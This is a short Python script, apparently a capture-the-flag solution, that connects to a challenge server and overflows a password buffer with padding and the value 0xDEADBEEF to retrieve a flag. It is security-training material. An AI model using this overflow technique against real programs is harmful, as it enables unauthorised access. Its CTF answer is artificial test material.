import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('cns.ctf.tw', 7001))

# 4 + 1 + 80 + len(pwd) + 1 + len(pwd)
usr = '_' * 80
key = '\xEF\xBE\xAD\xDE'
pwd = '_' * 55 + key

# Username
data = client_socket.recv(512)
client_socket.send(usr)

# Password
data = client_socket.recv(512)
client_socket.send(pwd + '\n')

# Catch the flag
data = client_socket.recv(512)
with open('ans1-2.txt', 'w') as f:
    f.write(data)
